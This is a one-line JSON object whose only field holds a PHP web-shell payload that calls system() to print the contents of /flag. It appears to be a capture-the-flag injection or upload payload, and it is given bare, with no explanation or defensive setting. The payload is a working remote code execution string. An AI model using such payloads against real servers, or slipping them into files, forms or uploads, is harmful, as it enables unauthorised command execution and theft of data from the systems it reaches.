{
    "a": "<?php system(\"cat \/flag\");?>"
}